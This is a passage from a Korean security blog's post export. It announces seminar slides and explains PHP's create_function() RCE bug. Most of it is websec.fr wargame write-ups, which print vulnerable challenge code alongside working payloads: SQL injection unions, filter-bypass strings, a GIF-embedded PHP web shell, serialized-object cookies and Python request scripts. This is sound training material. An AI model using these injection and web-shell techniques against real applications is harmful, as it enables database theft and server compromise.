https://www.notion.so/jhyeon/43ce112d299d42e0be73e5da5d9be39a","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/tags/Wargame/"}]},{"title":"Browser Auditor 기술 발표 자료","slug":"browser-auditor-200526","date":"2020-05-25T15:00:00.000Z","updated":"2020-05-25T15:00:00.000Z","comments":true,"path":"2020/05/26/browser-auditor-200526/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/26/browser-auditor-200526/","excerpt":"","text":"발표자료2019년 11월에 있었던 KUCIS 서경강권역 학술 세미나에서 발표 자료로 썼던 내용 입니다. 자료 다운로드 : https://drive.google.com/open?id=1mWcSwYwmdUHYZDLgb7szeHc7gbczpcpc","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Browser Auditor","slug":"Browser-Auditor","permalink":"https://blog.jhyeon.dev/tags/Browser-Auditor/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://blog.jhyeon.dev/tags/CSRF/"},{"name":"Chrome","slug":"Chrome","permalink":"https://blog.jhyeon.dev/tags/Chrome/"},{"name":"Firefox","slug":"Firefox","permalink":"https://blog.jhyeon.dev/tags/Firefox/"}]},{"title":"문서형 악성코드 분석 발표 자료(Malware Analyze)","slug":"malware-analyze-200526","date":"2020-05-25T15:00:00.000Z","updated":"2020-05-25T15:00:00.000Z","comments":true,"path":"2020/05/26/malware-analyze-200526/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/26/malware-analyze-200526/","excerpt":"","text":"발표자료2019년 8월에 있었던 KUCIS 영남권역 학술 세미나에서 발표 자료로 썼던 내용 입니다. 악성코드 개념, 종류, 사례 그리고 실제 악성코드 분석 결과 등에 대한 내용을 작성 하였습니다. 자료 다운로드 : https://drive.google.com/open?id=1gVxnWzPI8sX9k5yI-gG5L31Mx9wUKm68","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Malware","slug":"Malware","permalink":"https://blog.jhyeon.dev/tags/Malware/"},{"name":"Macro","slug":"Macro","permalink":"https://blog.jhyeon.dev/tags/Macro/"}]},{"title":"create_function() RCE 취약점 정리","slug":"function-rce-200515","date":"2020-05-14T15:00:00.000Z","updated":"2020-05-14T15:00:00.000Z","comments":true,"path":"2020/05/15/function-rce-200515/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/15/function-rce-200515/","excerpt":"","text":"개요create_function 함수는, php.net(https://www.php.net/manual/en/function.create-function.php) 에 정의된 내용으로, 매개변수를 전달받아 익명 함수를 생성하는 함수 입니다. 함수 정의해당 함수는 아래와 같이 사용할 수 있습니다. create_function ( string $args , string $code ) : string 함수 취약점 분석하지만, 함수를 잘못된 방법으로 사용할 시 RCE 취약점이 발생하게 되는데 예시는 다음과 같습니다. create_function(string $args, $_POST[&#39;code&#39;]); 위와 같은 방법으로 사용할 시에 두번째 인자에 임의적인 값을 주입하여 원하는 코드를 실행시킬 수 있습니다. return -1;&#125; phpinfo(); /*","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://blog.jhyeon.dev/tags/RCE/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"}]},{"title":"websec.fr babysteps Write up","slug":"websecbaby-200514","date":"2020-05-13T15:00:00.000Z","updated":"2020-05-13T15:00:00.000Z","comments":true,"path":"2020/05/14/websecbaby-200514/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/14/websecbaby-200514/","excerpt":"","text":"1. LEVEL-1class LevelOne &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#39;database.db&#39;, SQLITE3_OPEN_READONLY); $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;; $getUsers = $pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125; &#125; 문제 풀이의 핵심적인 부분만 추려내서 보자. $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;; 일단 쿼리문의 형태는 다음과 같다, $injection 이 부분에 입력하는 데이터가 들어가게 된다. 예를 들면 1을 입력했을 때 where id=1 limit 1과 같은 구조를 가질 것 이다. 먼저 해당 문제는 sqlite3 를 사용하는 문제이기 때문에 테이블의 구조를 union 연산자로 뽑아보자. table structure –&gt; 1 union select 1, sql from sqlite_master– - 그러면 아래와 같이 결과를 출력해줄 것 이다. id -&gt; 1 username -&gt; CREATE TABLE users(id int(7), username varchar(255), password varchar(255)) 테이블 명, 컬럼 구조를 알았으니 그냥 이제 데이터 빼내오면 된다. password –&gt; 1 union select 1, password from users where id=1– - 2. LEVEL-4if (isset ($_COOKIE[&#39;leet_hax0r&#39;])) &#123; $sess_data = unserialize (base64_decode ($_COOKIE[&#39;leet_hax0r&#39;])); try &#123; if (is_array($sess_data) &amp;&amp; $sess_data[&#39;ip&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) &#123; die(&#39;CANT HACK US!!!&#39;); &#125; &#125; catch(Exception $e) &#123; echo $e; &#125; &#125; else &#123; $cookie = base64_encode (serialize (array ( &#39;ip&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;]))) ; setcookie (&#39;leet_hax0r&#39;, $cookie, time () + (86400 * 30)); &#125; if (isset ($_REQUEST[&#39;id&#39;]) &amp;&amp; is_numeric ($_REQUEST[&#39;id&#39;])) &#123; try &#123; $sql-&gt;query .= $_REQUEST[&#39;id&#39;]; &#125; catch(Exception $e) &#123; echo &#39; Invalid query&#39;; &#125; &#125; &lt;?php class SQL &#123; public $query = &#39;&#39;; public $conn; public function __construct() &#123; &#125; public function connect() &#123; $this-&gt;conn = new SQLite3 (&quot;database.db&quot;, SQLITE3_OPEN_READONLY); &#125; public function SQL_query($query) &#123; $this-&gt;query = $query; &#125; public function execute() &#123; return $this-&gt;conn-&gt;query ($this-&gt;query); &#125; public function __destruct() &#123; if (!isset ($this-&gt;conn)) &#123; $this-&gt;connect (); &#125; $ret = $this-&gt;execute (); if (false !== $ret) &#123; while (false !== ($row = $ret-&gt;fetchArray (SQLITE3_ASSOC))) &#123; echo &#39;&lt;p class=&quot;well&quot;&gt;&lt;strong&gt;Username:&lt;strong&gt; &#39; . $row[&#39;username&#39;] . &#39;&lt;/p&gt;&#39;; &#125; &#125; &#125; &#125; ?&gt; 해당 문제는 PHP Object Injection(Serialize) 문제 이다. 코드의 실행 흐름을 보면 leet_hax0r 라는 쿠키가 존재하면, $sess_data 변수에 쿠키값을 unserialize 해주고 값을 담는다. 결론은 SQL 쿼리문을 serialize -&gt; base64_encode 한 다음 쿠키 값을 바꿔주면 원하는 쿼리문을 실행시킬 수가 있다. 문제와 조건을 맞춰서 seralize화 코드를 짜서 풀었는데 아래와 같다. &lt;?php class SQL &#123; public $query = &#39;query&#39;; public $conn; &#125; $sql = new SQL; $result = serialize($sql); $encode = base64_encode($result); echo $encode; ?&gt; table structure –&gt; select id, username from users where id=1 union select 1, sql from sqlite_master– - password –&gt; select password as username from users where id=1– - 3. LEVEL-17&lt;?php include &quot;flag.php&quot;; function sleep_rand() &#123; /* I wish php5 had random_int() */ $range = 100000; $bytes = (int) (log($range, 2) / 8) + 1; do &#123; /* Side effect: more random cpu cycles wasted ;) */ $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes))); &#125; while ($rnd &gt;= $range); usleep($rnd); &#125; ?&gt; &lt;?php if (! strcasecmp ($_POST[&#39;flag&#39;], $flag)) echo &#39;&lt;div class=&quot;alert alert-success&quot;&gt;Here is your flag: &lt;mark&gt;&#39; . $flag . &#39;&lt;/mark&gt;.&lt;/div&gt;&#39;; else echo &#39;&lt;div class=&quot;alert alert-danger&quot;&gt;Invalid flag, sorry.&lt;/div&gt;&#39;; ?&gt; 조건문만 보고 바로 strcmp 취약점이라는 것을 알 수 있었다. php loose comparison 라고도 부르는데, 참고 자료는 아래를 확인하자. 즉 $_POST[‘flag’] 부분을 배열로 넘겨주면 된다. flag[]=hi 참고(http request online) : https://reqbin.com/ 참고(php loose comparison) : https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison 4. LEVEL-25&lt;?php parse_str(parse_url($_SERVER[&#39;REQUEST_URI&#39;])[&#39;query&#39;], $query); foreach ($query as $k =&gt; $v) &#123; if (stripos($v, &#39;flag&#39;) !== false) die(&#39;You are not allowed to get the flag, sorry :/&#39;); &#125; include $_GET[&#39;page&#39;] . &#39;.txt&#39;; ?&gt; parse_url 함수에서 발생하는 버그(좋버그?) 같은 개념의 문제이다.. 간단히 요약만 하면 주소에서 //를 사용하면 http://와 같은 개념이다. 그런데 /// 를 쓰면 이 함수에서는 정상적인 호스트 값이 아님을 인식하여 false를 반환시킬 수 있다. http://websec.fr///level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C 이외에도 포트를 사용한 방법, 비정상 페이로드를 입력하여 오류를 발생 시킬수도 있다. 기타 방법 : http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C:80 기타 방법2 : http://websec.fr/level25/index.php?page=flag&amp;send=%EC%A0%9C%EC%B6%9C&amp;test=1:1 5. LEVEL-28&lt;?php if(isset($_POST[&#39;submit&#39;])) &#123; if ($_FILES[&#39;flag_file&#39;][&#39;size&#39;] &gt; 4096) &#123; die(&#39;Your file is too heavy.&#39;); &#125; $filename = md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;.php&#39;; $fp = fopen($_FILES[&#39;flag_file&#39;][&#39;tmp_name&#39;], &#39;r&#39;); $flagfilecontent = fread($fp, filesize($_FILES[&#39;flag_file&#39;][&#39;tmp_name&#39;])); @fclose($fp); file_put_contents($filename, $flagfilecontent); if (md5_file($filename) === md5_file(&#39;flag.php&#39;) &amp;&amp; $_POST[&#39;checksum&#39;] == crc32($_POST[&#39;checksum&#39;])) &#123; include($filename); // it contains the `$flag` variable &#125; else &#123; $flag = &quot;Nope, $filename is not the right file, sorry.&quot;; sleep(1); // Deter bruteforce &#125; unlink($filename); &#125; ?&gt; 음 여러가지로 고민을 좀 했던 문제이다. md5, crc32를 조건을 우회해서 접근할까? 라는 생각을 잠깐 해봤었던 나는 정상이 아닌 것 같다. 암튼 본론으로 가면 해당 문제는 레이스 컨디션(race condition) 기법으로 풀이 하였다. 파일을 업로드 하고, unlink 하기전 sleep(1) 라는 1초 시간이 있어 이 기법을 활용해 서로 다른 브라우저에서 동시에 요청을 하면, 충분히 레이스 컨디션으로 서버가 unlink 하기전에 파일을 읽어올 수 있을 것 이라고 생각 하였다. 코드 풀이 추가 예정","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"}]},{"title":"websec.fr easy Write up","slug":"webseceasy-200514","date":"2020-05-13T15:00:00.000Z","updated":"2020-05-13T15:00:00.000Z","comments":true,"path":"2020/05/14/webseceasy-200514/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/14/webseceasy-200514/","excerpt":"","text":"1. LEVEL 2class LevelTwo &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#39;leveltwo.db&#39;, SQLITE3_OPEN_READONLY); $searchWords = implode ([&#39;union&#39;, &#39;order&#39;, &#39;select&#39;, &#39;from&#39;, &#39;group&#39;, &#39;by&#39;], &#39;|&#39;); $injection = preg_replace (&#39;/&#39; . $searchWords . &#39;/i&#39;, &#39;&#39;, $injection); $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;; $getUsers = $pdo-&gt;query ($query); $users = $getUsers-&gt;fetchArray (SQLITE3_ASSOC); if ($users) &#123; return $users; &#125; return false; &#125; &#125; 음 이전에 babystep 단계에서 풀었던 문제와 비슷한 수준입니다. 조금 달라진 것이 있다면 입력값 필터링(union, order, select) 등을 필터링 합니다. 근데 정규식(match)가 아닌 replace 방식이기 때문에 ununionion 과 같이 사용한다면 이를 우회할 수 있습니다. table structure -&gt; 1 ununionion seselectlect 1,sql frfromom sqlite_master– - password -&gt; 1 ununionion seselectlect id,password frfromom users where id=1– - 2. LEVEL 8&lt;?php $uploadedFile = sprintf(&#39;%1$s/%2$s&#39;, &#39;/uploads&#39;, sha1($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;.gif&#39;); if (file_exists ($uploadedFile)) &#123; unlink ($uploadedFile); &#125; if ($_FILES[&#39;fileToUpload&#39;][&#39;size&#39;] &lt;= 50000) &#123; if (getimagesize ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) !== false) &#123; if (exif_imagetype($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;]) === IMAGETYPE_GIF) &#123; move_uploaded_file ($_FILES[&#39;fileToUpload&#39;][&#39;tmp_name&#39;], $uploadedFile); echo &#39;&lt;p class=&quot;lead&quot;&gt;Dump of &lt;a href=&quot;/level08&#39; . $uploadedFile . &#39;&quot;&gt;&#39;. htmlentities($_FILES[&#39;fileToUpload&#39;][&#39;name&#39;]) . &#39;&lt;/a&gt;:&lt;/p&gt;&#39;; echo &#39;&lt;pre&gt;&#39;; include_once($uploadedFile); echo &#39;&lt;/pre&gt;&#39;; unlink($uploadedFile); &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is not a GIF&lt;/p&gt;&#39;; &#125; &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is not an image&lt;/p&gt;&#39;; &#125; &#125; else &#123; echo &#39;&lt;p class=&quot;text-danger&quot;&gt;The file is too big&lt;/p&gt;&#39;; &#125; ?&gt; 파일 업로드 취약점 문제이다. gif 확장자의 사진 파일만 업로드할 수 있도록 해놨지만 사진 파일 안에 php 코드를 넣어서 웹 쉘을 사용할 수 있다. 다만 시스템 함수 사용이 안되기 때문에 scandir 함수를 통해 디렉토리 목록을 읽고 플래그 파일을 읽으면 된다. &lt;?php print_r(scandir(&quot;./&quot;)); ?&gt; &lt;?php show_source(&quot;flag.txt&quot;); ?&gt; 3. LEVEL 10&lt;?php if (isset ($_REQUEST[&#39;f&#39;]) &amp;&amp; isset ($_REQUEST[&#39;hash&#39;])) &#123; $file = $_REQUEST[&#39;f&#39;]; $request = $_REQUEST[&#39;hash&#39;]; $hash = substr (md5 ($flag . $file . $flag), 0, 8); echo &#39;&lt;div class=&quot;row&quot;&gt;&lt;br&gt;&lt;pre&gt;&#39;; if ($request == $hash) &#123; show_source ($file); &#125; else &#123; echo &#39;Permission denied!&#39;; &#125; echo &#39;&lt;/pre&gt;&lt;/div&gt;&#39;; &#125; ?&gt; $file 변수에는 특정 파일명 를 넣고 $request 변수에는 hash 값을 입력하게 되는데, 이 입력한 hash에 대해 $request == $hash 와 같이 $hash 변수에 정의된 값이랑 비교하게 된다. 이후 두 해쉬값이 동일하면 show_source 함수를 통해 $file에 정의된 파일의 소스코드를 보여준다. 조건문을 보면 == (loose comparison) 느슨한 비교를 하고 있기 때문에 magic hash 취약점을 이용하면 풀이가 가능하다. 관련 자료는 아래 사이트를 참고하자. 자료 : https://velog.io/@woounnan/ROOTME-PHP-Loose-Comparison #!/usr/bin/python import requests def run(): url = &quot;https://websec.fr/level10/index.php&quot; f = &quot;flag.php&quot; for i in range(870,1000): param = &#123;&quot;f&quot;:f, &quot;hash&quot;:0&#125; r = requests.post(url, data=param) if(&quot;Permission denied!&quot; not in r.text): print(r.text) break else: print &quot;sending payload..&quot; +str(i) f = &#39;.&#39; + &#39;/&#39; * i + &#39;flag.php&#39; if __name__ == &#39;__main__&#39;: run() 4. LEVEL 11&lt;?php ini_set(&#39;display_errors&#39;, &#39;on&#39;); ini_set(&#39;error_reporting&#39;, E_ALL); function sanitize($id, $table) &#123; /* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */ if (! is_numeric ($id) or $id &lt; 2) &#123; exit(&quot;The id must be numeric, and superior to one.&quot;); &#125; /* Rock-solid too! */ $special1 = [&quot;!&quot;, &quot;\\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;-&quot;]; $special2 = [&quot;.&quot;, &quot;/&quot;, &quot;:&quot;, &quot;;&quot;, &quot;&lt;&quot;, &quot;=&quot;, &quot;&gt;&quot;, &quot;?&quot;, &quot;@&quot;, &quot;[&quot;, &quot;\\\\&quot;, &quot;]&quot;]; $special3 = [&quot;^&quot;, &quot;_&quot;, &quot;`&quot;, &quot;&#123;&quot;, &quot;|&quot;, &quot;&#125;&quot;]; $sql = [&quot;union&quot;, &quot;0&quot;, &quot;join&quot;, &quot;as&quot;]; $blacklist = array_merge ($special1, $special2, $special3, $sql); foreach ($blacklist as $value) &#123; if (stripos($table, $value) !== false) exit(&quot;Presence of &#39;&quot; . $value . &quot;&#39; detected: abort, abort, abort!\\n&quot;); &#125; &#125; if (isset ($_POST[&#39;submit&#39;]) &amp;&amp; isset ($_POST[&#39;user_id&#39;]) &amp;&amp; isset ($_POST[&#39;table&#39;])) &#123; $id = $_POST[&#39;user_id&#39;]; $table = $_POST[&#39;table&#39;]; sanitize($id, $table); $pdo = new SQLite3(&#39;database.db&#39;, SQLITE3_OPEN_READONLY); $query = &#39;SELECT id,username FROM &#39; . $table . &#39; WHERE id = &#39; . $id; //$query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id; $getUsers = $pdo-&gt;query($query); $users = $getUsers-&gt;fetchArray(SQLITE3_ASSOC); $userDetails = false; if ($users) &#123; $userDetails = $users; $userDetails[&#39;table&#39;] = htmlentities($table); &#125; &#125; ?&gt; sqlite injection 문제이다. 입력할 수 있는 부분은 user_id, table 두 가지가 있는데 user_id 부분에는 아래와 같이 is_numberic 함수로 숫자만 입력할 수 있도록 필터링 한다. if (! is_numeric ($id) or $id &lt; 2) &#123; exit(&quot;The id must be numeric, and superior to one.&quot;); &#125; 때문에 table 부분에 payload를 작성하고 데이터를 보낼 것이다. 여기서도 보고가야할 점은 union,join 이외에 여러가지 특수 문자들을 필터링 하고 있어서 as가 없어도 alias를 사용할 수 있기 때문에 이것을 우회할 수 있다. $query = &#39;SELECT id,username,enemy FROM &#39; . $table . &#39; WHERE id = &#39; . $id; 이제 쿼리문을 맞춰주기만 하면 되는데 코드 내에 이렇게 답을 다 주는 수준이라서 그냥 뽑아내기만 하면 된다. #!/usr/bin/python3 import requests def submit(): url = &#39;https://websec.fr/level11/index.php&#39; param = &#123;&#39;user_id&#39;:&#39;2&#39;,&#39;table&#39;:&#39;(select 2 id,enemy username from costume)&#39;,&#39;submit&#39;:&#39;submit&#39;&#125; r = requests.post(url, data=param) print r.text def main(): submit() main() 5. LEVEL 13&lt;?php // Defines $flag include &#39;flag.php&#39;; $db = new PDO(&#39;sqlite::memory:&#39;); $db-&gt;exec(&#39;CREATE TABLE users ( user_id INTEGER PRIMARY KEY, user_name TEXT NOT NULL, user_privileges INTEGER NOT NULL, user_password TEXT NOT NULL )&#39;); $db-&gt;prepare(&quot;INSERT INTO users VALUES(0, &#39;admin&#39;, 0, &#39;$flag&#39;);&quot;)-&gt;execute(); for($i=1; $i&lt;25; $i++) &#123; $pass = md5(uniqid()); $user = &quot;user_&quot; . substr(crc32($pass), 0, 2); $db-&gt;prepare(&quot;INSERT INTO users VALUES($i, &#39;$user&#39;, 1, &#39;$pass&#39;);&quot;)-&gt;execute(); &#125; ?&gt; &lt;?php if (isset($_GET[&#39;ids&#39;])) &#123; if ( ! is_string($_GET[&#39;ids&#39;])) &#123; die(&quot;Don&#39;t be silly.&quot;); &#125; if ( strlen($_GET[&#39;ids&#39;]) &gt; 70) &#123; die(&quot;Please don&#39;t check all the privileges at once.&quot;); &#125; $tmp = explode(&#39;,&#39;,$_GET[&#39;ids&#39;]); for ($i = 0; $i &lt; count($tmp); $i++ ) &#123; $tmp[$i] = (int)$tmp[$i]; if( $tmp[$i] &lt; 1 ) &#123; unset($tmp[$i]); &#125; &#125; $selector = implode(&#39;,&#39;, array_unique($tmp)); $query = &quot;SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (&quot; . $selector . &quot;));&quot;; $stmt = $db-&gt;query($query); echo &#39;&lt;br&gt;&#39;; echo &#39;&lt;div class=&quot;well&quot;&gt;&#39;; echo &#39;&lt;ul&gt;&#39;; while ($row = $stmt-&gt;fetch(\\PDO::FETCH_ASSOC)) &#123; echo &quot;&lt;li&gt;&quot;; echo &quot;User &lt;em&gt;&quot; . $row[&#39;user_name&#39;] . &quot;&lt;/em&gt;&quot;; echo &quot; with id &lt;code&gt;&quot; . $row[&#39;user_id&#39;] . &#39;&lt;/code&gt;&#39;; echo &quot; has &lt;b&gt;&quot; . ($row[&#39;user_privileges&#39;] == 0?&quot;all&quot;:&quot;no&quot;) . &quot;&lt;/b&gt; privileges.&quot;; echo &quot;&lt;/li&gt;\\n&quot;; &#125; echo &quot;&lt;/ul&gt;&quot;; echo &quot;&lt;/div&gt;&quot;; &#125; ?&gt; 문제의 코드이다. 핵심만 찾아서 한번 분석 해보자 $tmp = explode(&#39;,&#39;,$_GET[&#39;ids&#39;]); for ($i = 0; $i &lt; count($tmp); $i++ ) &#123; $tmp[$i] = (int)$tmp[$i]; if( $tmp[$i] &lt; 1 ) &#123; unset($tmp[$i]); &#125; &#125; 이 부분을 보면 explode를 하고나서 for문을 돌리는데 여기서 $tmp 부분을 고정으로 사용하지 않고 반복문이 돌때마다 다시 저장해주고 있다. $tmp[i] &lt; 1 부분에서 1보다 작은 값이 들어가게 된다면 unset를 수행하게 되는데 이 떼 반복문에 도는 count 함수의 반환 값은 처음에 실행되었을 때의 값이랑 달라지게 된다. 그 점을 보면 정수형이 아닌 문자들이 값으로 들어오기 때문에 이 취약점을 이용해 문제를 풀이할 수 있다. #!/usr/bin/python3 import requests def submit(data): url = &quot;http://websec.fr/level13/index.php&quot; param = &#123;&#39;ids&#39;:data,&#39;submit&#39;:&#39;Go&#39;&#125; r = requests.get(url, params=param) print r.text data = &#39;0,0,0,0)) union select user_password,user_name,3 from users--&#39; submit(data) 6. LEVEL 15&lt;?php ini_set(&#39;display_errors&#39;, &#39;on&#39;); ini_set(&#39;error_reporting&#39;, E_ALL); $success = &#39; &lt;div class=&quot;alert alert-success alert-dismissible&quot; role=&quot;alert&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt; Function declared. &lt;/div&gt; &#39;; include &quot;flag.php&quot;; if (isset ($_POST[&#39;c&#39;]) &amp;&amp; !empty ($_POST[&#39;c&#39;])) &#123; $fun = create_function(&#39;$flag&#39;, $_POST[&#39;c&#39;]); print($success); //fun($flag); if (isset($_POST[&#39;q&#39;]) &amp;&amp; $_POST[&#39;q&#39;] == &#39;checked&#39;) &#123; die(); &#125; &#125; ?&gt; c라는 변수에 우리가 임의로 값을 입력할 수 있다. 입력한 값이 create_function 함수를 거쳐 $fun 변수에 저장되고, 이후 $success 함수에 정의된 내용을 출력해준다. 취약점 관련해서 자료를 찾아 보다가 RCE 취약점이 있음을 알 수 있었다. 관련 자료는 해당 포스팅이 끝나고 별도로 업로드 할 예정이니 아래 링크를 참고하자. 함수를 만들어 줄때 보면 $_POST[‘c’] 와 같이 두번째 인자를 임의로 조작할 수 있다. 이 부분을 이용해서 RCE 취약점을 발생시켜 플래그를 얻을 수 있다. return% -1;} show_source(“flag.php”); /* 참고 : https://blog.jhyeon.xyz/category/docx/function_rce/ 8. LEVEL 20&lt;?php include &quot;flag.php&quot;; class Flag &#123; public function __destruct() &#123; global $flag; echo $flag; &#125; &#125; function sanitize($data) &#123; /* i0n1c&#39;s bypass won&#39;t save you this time! (https://www.exploit-db.com/exploits/22547/) */ if ( ! preg_match (&#39;/[A-Z]:/&#39;, $data)) &#123; return unserialize ($data); &#125; if ( ! preg_match (&#39;/(^|;|&#123;|&#125;)O:[0-9+]+:&quot;/&#39;, $data )) &#123; return unserialize ($data); &#125; return false; &#125; $data = Array(); if (isset ($_COOKIE[&#39;data&#39;])) &#123; $data = sanitize (base64_decode ($_COOKIE[&#39;data&#39;])); &#125; if (isset ($_POST[&#39;value&#39;]) and ! empty ($_POST[&#39;value&#39;])) &#123; /* Add a value twice to remove it from the list. */ if (($key = array_search ($_POST[&#39;value&#39;], $data)) !== false) &#123; unset ($data[$key]); &#125; else &#123; /* Else, simply add it. */ array_push ($data, $_POST[&#39;value&#39;]); &#125; setcookie (&#39;data&#39;, base64_encode (serialize ($data))); &#125; ?&gt; PHP Object Injection 문제가 다시 돌아왔다. 소스코드를 분석해보면 일단 data 라는 쿠키에 serialize 된 값을 넣어주는 것으로 보아 class Flag 객체를 serialize 해서 넣어주면 된다. 그런데 data 값에 O:4:’Flag’ 이런식으로 넣어주는 데 이 구문이 필터링되서 사용을 못한다. exploit-db 사이트를 주면서 O:+15 이런식의 bypass도 봤는데 이것도 사용이 안된다. 그래서 삽질을 좀 해본 결과로,, 아래 블로그를 찾아서 해결할 수 있었는데 https://www.evonide.com/fuzzing-unserialize/ case C의 경우와 O의 경우에 같은 분기로 넘어가게 된다. 여기서 그러면 C:4:’Flag’ 이런식으로 써줄 수 있지 않을까 하고 테스트 해보니 잘 작동된다. 아래 구문을 serialize -&gt; base64 encode 방식을 써서 쿠키값을 넣어면 플래그를 준다. serialize : C:4:’Flag’:0:{} serialize(base64) -&gt; Qzo0OuKAmUZsYWfigJk6MDp7fQ== 9. LEVEL 22&lt;?php class A &#123; public $pub; protected $pro ; private $pri; function __construct($pub, $pro, $pri) &#123; $this-&gt;pub = $pub; $this-&gt;pro = $pro; $this-&gt;pri = $pri; &#125; &#125; include &#39;file_containing_the_flag_parts.php&#39;; $a = new A($f1, $f2, $f3); unset($f1); unset($f2); unset($f3); $funcs_internal = get_defined_functions()[&#39;internal&#39;]; /* lets allow some secure funcs here */ unset ($funcs_internal[array_search(&#39;strlen&#39;, $funcs_internal)]); unset ($funcs_internal[array_search(&#39;print&#39;, $funcs_internal)]); unset ($funcs_internal[array_search(&#39;strcmp&#39;, $funcs_internal)]); unset ($funcs_internal[array_search(&#39;strncmp&#39;, $funcs_internal)]); $funcs_extra = array (&#39;eval&#39;, &#39;include&#39;, &#39;require&#39;, &#39;function&#39;); $funny_chars = array (&#39;\\.&#39;, &#39;\\+&#39;, &#39;-&#39;, &#39;&quot;&#39;, &#39;;&#39;, &#39;`&#39;, &#39;\\[&#39;, &#39;\\]&#39;); $variables = array (&#39;_GET&#39;, &#39;_POST&#39;, &#39;_COOKIE&#39;, &#39;_REQUEST&#39;, &#39;_SERVER&#39;, &#39;_FILES&#39;, &#39;_ENV&#39;, &#39;HTTP_ENV_VARS&#39;, &#39;_SESSION&#39;, &#39;GLOBALS&#39;); $blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables); $insecure = false; foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#39;/&#39; . $blacklisted . &#39;/im&#39;, $code)) &#123; $insecure = true; break; &#125; &#125; if ($insecure) &#123; echo &#39;Insecure code detected!&#39;; &#125; else &#123; eval (&quot;echo $code;&quot;); &#125; ?&gt; 먼저 $code 변수에는 임의로 값을 넣어 eval($code) 형식으로 실행 시킬 수 있다. php sandbox형 문제인데, 처음에 생각한 방법이 $blacklist에 정의된 배열을 뽑아내서 플래그를 볼려고 했다. 근데 길이 제한이 21자 이기 때문에 페이로드가 길어지면 사용이 불가능하다. (심지어 플래그 파일명이 졸라 길다) 하지만 또 이상한 부분이 있다. a 객체를 만들어주고 unset 해주는 부분을 볼 수 있는데, 이 객체를 사용해서 var_dump로 출력을 찍어내서 보면 플래그가 있다. 위 과정들을 손수 하기에는 아~주 귀찮아서 파이썬으로 짜서 풀었다. 배열 내에서 var_dump() 함수 찾는게 좀 노가다 인데.. 그냥 좀 기다리면 된다. #!/usr/bin/python3 import requests def read(): for i in range(1,1000): blacklist = &#39;$blacklist&#123;&#39;+str(i)+&#39;&#125;($a)&#39; url = &#39;https://websec.fr/level22/index.php&#39; param = &#123;&#39;code&#39;:blacklist, &#39;submit&#39;:&#39;a&#39;&#125; r = requests.get(url, params=param) if &quot;WEBSEC&quot; in r.text: print r.text break else: print &quot;sending payload&quot;+blacklist read() 10. LEVEL 24&lt;?php ini_set(&#39;display_errors&#39;, &#39;on&#39;); ini_set(&#39;error_reporting&#39;, E_ALL); session_start(); include &#39;clean_up.php&#39;; /* periodic cleanup */ foreach (glob(&quot;./uploads/*&quot;) as $file) &#123; if (is_file($file)) &#123; unlink($file); &#125; else &#123; if (time() - filemtime($file) &gt;= 60 * 60 * 24 * 7) &#123; Delete($file); &#125; &#125; &#125; $upload_dir = sprintf(&quot;./uploads/%s/&quot;, session_id()); @mkdir($upload_dir, 0755, true); /* sandboxing ! */ chdir($upload_dir); ini_set(&#39;open_basedir&#39;, &#39;.&#39;); $p = &quot;list&quot;; $data = &quot;&quot;; $filename = &quot;&quot;; if (isset($_GET[&#39;p&#39;]) &amp;&amp; 